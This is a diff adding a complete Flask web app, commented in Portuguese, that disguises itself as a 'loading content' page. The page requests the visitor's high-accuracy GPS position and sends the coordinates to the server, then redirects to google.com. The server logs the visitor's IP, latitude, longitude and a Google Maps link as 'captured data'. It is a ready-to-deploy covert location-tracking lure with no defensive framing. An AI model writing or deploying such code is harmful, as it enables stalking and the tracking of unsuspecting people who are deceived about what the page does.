@@ -1,0 +1,82 @@
+from flask import Flask, render_template_string, request, jsonify
+import datetime
+
+app = Flask(__name__)
+
+# Página HTML simples que pede permissão de GPS e envia para o servidor
+HTML_PAGE = """
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Carregando...</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 20%; background-color: #f4f4f9; }
+        h2 { color: #333; }
+    </style>
+</head>
+<body>
+    <h2>Carregando conteúdo, por favor aguarde...</h2>
+    <script>
+        function enviarLocalizacao(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            fetch('/salvar-loc', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude: lat, longitude: lon, precisao: accuracy })
+            }).then(() => {
+                // Redireciona para onde você quiser após capturar
+                window.location.href = "https://google.com";
+            });
+        }
+
+        function erroLocalizacao(error) {
+            console.log("Erro ou negado: " + error.message);
+            window.location.href = "https://google.com";
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(enviarLocalizacao, erroLocalizacao, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        } else {
+            window.location.href = "https://google.com";
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGE)
+
+@app.route('/salvar-loc', methods=['POST'])
+def salvar_loc():
+    dados = request.json
+    lat = dados.get('latitude')
+    lon = dados.get('longitude')
+    precisao = dados.get('precisao')
+    
+    # Pega o IP real se estiver atrás de proxy (como o Render)
+    ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
+    agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Imprime no console/logs do Render
+    print(f"\n[!] DADOS CAPTURADOS EM {agora}")
+    print(f"IP: {ip_cliente}")
+    print(f"Latitude: {lat}")
+    print(f"Longitude: {lon}")
+    print(f"Precisão: {precisao} metros")
+    print(f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n")
+    
+    return jsonify({"status": "sucesso"})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
